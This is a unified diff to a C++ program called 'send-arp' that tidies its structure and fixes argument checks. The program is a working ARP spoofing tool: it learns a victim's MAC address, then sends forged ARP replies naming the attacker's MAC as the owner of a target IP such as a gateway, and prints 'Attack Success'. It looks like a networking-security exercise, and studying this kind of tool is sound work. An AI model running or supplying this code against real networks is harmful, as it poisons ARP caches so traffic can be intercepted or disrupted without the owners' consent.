@@ -1,12 +1,15 @@
 #include <iostream>
+#include <fstream>
+
 #include <cstdio>
 #include <cstring>
-#include <fstream>
 
 #include <sys/socket.h>
 #include <sys/ioctl.h>
+
 #include <arpa/inet.h>
 #include <net/if.h>
+
 #include <pcap.h>
 
 #include "mac.h"
@@ -23,10 +26,32 @@ struct EthArpPacket final {
 };
 #pragma pack(pop)
 
-
 void usage() {
 	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
 	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1");
+}
+
+void attacker_mac(string interface, Mac& attackerMac) {
+	ifstream fp ("/sys/class/net/" + interface + "/address");
+	string macaddr;
+	fp >> macaddr;
+	fp.close();
+	attackerMac = macaddr;
+
+}
+
+void attacker_ip(string interface, Ip& attackerIp ) {
+
+	int s = socket(AF_INET, SOCK_DGRAM, 0);
+	ifreq ifr;
+	ifr.ifr_addr.sa_family = AF_INET;
+	strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ -1);
+
+	ioctl(s, SIOCGIFADDR, &ifr);
+
+	string ipaddr = inet_ntoa(((sockaddr_in *) &ifr.ifr_addr) -> sin_addr);
+	attackerIp = Ip(ipaddr);
+
 }
 
 void send_arp(pcap_t* handle, Mac& eth_dmac, Mac& eth_smac, Mac& arp_smac, Ip& arp_sip, Mac& arp_tmac, Ip& arp_tip, bool isRequest ){
@@ -53,9 +78,30 @@ void send_arp(pcap_t* handle, Mac& eth_dmac, Mac& eth_smac, Mac& arp_smac, Ip& a
 	}
 }
 
+void sender_mac(pcap_t* handle, Mac& senderMac, Ip& senderIp, Mac& attackerMac, Ip& attackerIp) {
+    Mac broadcastMac = Mac("FF:FF:FF:FF:FF:FF");
+    Mac nullMac = Mac("00:00:00:00:00:00");
+    
+    send_arp(handle, broadcastMac, senderMac, attackerMac, attackerIp, nullMac, senderIp, true );
+
+    while(true){
+        struct pcap_pkthdr* header;
+        const u_char* packet;
+        int res = pcap_next_ex(handle, &header, &packet);
+        
+        if (res == 0) continue;
+
+        EthArpPacket* ethArpPacket = (EthArpPacket*)packet;
+        if(ethArpPacket->eth_.type() == EthHdr::Arp && ethArpPacket->arp_.op() == ArpHdr::Reply && ethArpPacket->arp_.sip() == senderIp && ethArpPacket->arp_.tip() == attackerIp){
+            senderMac = ethArpPacket->arp_.smac();
+            break;
+        }
+    }
+}
+
 int main(int argc, char* argv[]) {
-	int len = argc;
-	if (len < 4 || len % 2 != 0 ) {
+	int len = argc/2;
+	if (argc < 4 || argc %2  != 0 ) {
 		usage();
 		return 0;
 	}
@@ -64,22 +110,9 @@ int main(int argc, char* argv[]) {
 	Ip attackerIp, senderIp, targetIp;
 
 	string interface = argv[1];
-	ifstream fp ("/sys/class/net/" + interface + "/address");
-	string macaddr;
-	fp >> macaddr;
-	fp.close();
-	attackerMac = macaddr;
 
-	int s = socket(AF_INET, SOCK_DGRAM, 0);
-	ifreq ifr;
-	ifr.ifr_addr.sa_family = AF_INET;
-	strncpy(ifr.ifr_name, interface.c_str(), IFNAMSIZ -1);
-
-	ioctl(s, SIOCGIFADDR, &ifr);
-
-	string ipaddr = inet_ntoa(((sockaddr_in *) &ifr.ifr_addr) -> sin_addr);
-	attackerIp = Ip(ipaddr);
-	
+	attacker_mac(interface, attackerMac);
+	attacker_ip(interface, attackerIp);
 	cout << "----------------------" << "\n";
 	cout << "<Attacker>" << "\n";
 	cout << "MAC : " << string(attackerMac) << "\n";
@@ -87,42 +120,28 @@ int main(int argc, char* argv[]) {
 	
 	char* dev = argv[1];
 	char errbuf[PCAP_ERRBUF_SIZE];
-
+	
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+	
 	if (handle == nullptr) {
-		fprintf(stderr, "cant' open %s(%s)\n", dev, errbuf);
+		fprintf(stderr, "can't open %s(%s)\n", dev, errbuf);
 		return -1;
 	}
 	
-	for(int i=1; i< len/2 ; i++) {
+	for(int i=1; i< len ; i++) {
 		senderIp = Ip(argv[i*2]);
 		cout <<"Sender IP : " << argv[i*2] << "\n";
 		targetIp = Ip(argv[i*2 +1]);
 		cout << "Target IP : " << argv[i*2+1] << "\n";
-		
-		Mac broadcastMac = Mac("FF:FF:FF:FF:FF:FF");
-	        Mac nullMac = Mac("00:00:00:00:00:00");
-	    
-	        send_arp(handle, broadcastMac, senderMac, attackerMac, attackerIp, nullMac, senderIp, true );
 
-	        while(true){
-		    struct pcap_pkthdr* header;
-		    const u_char* packet;
-		    int res = pcap_next_ex(handle, &header, &packet);
-		
-		    if (res == 0) continue;
-		    EthArpPacket* ethArpPacket = (EthArpPacket*)packet;
-		    if(ethArpPacket->eth_.type() == EthHdr::Arp && ethArpPacket->arp_.op() == ArpHdr::Reply && ethArpPacket->arp_.sip() == senderIp && ethArpPacket->arp_.tip() == attackerIp){
-		        senderMac = ethArpPacket->arp_.smac();
-		        break;
-	            }
-	    	}
+		sender_mac(handle, senderMac, senderIp, attackerMac, attackerIp);
 		cout << "Sender MAC : " << string(senderMac) << "\n";
+		
 		send_arp(handle, senderMac, attackerMac, attackerMac, targetIp, senderMac, senderIp, false );
 		cout << "\nAttack Success" << "\n";
-		cout << "---------------------\n";
+		cout << "----------------------" << "\n";
+		
 
 	}
-	
 	pcap_close(handle);
 }
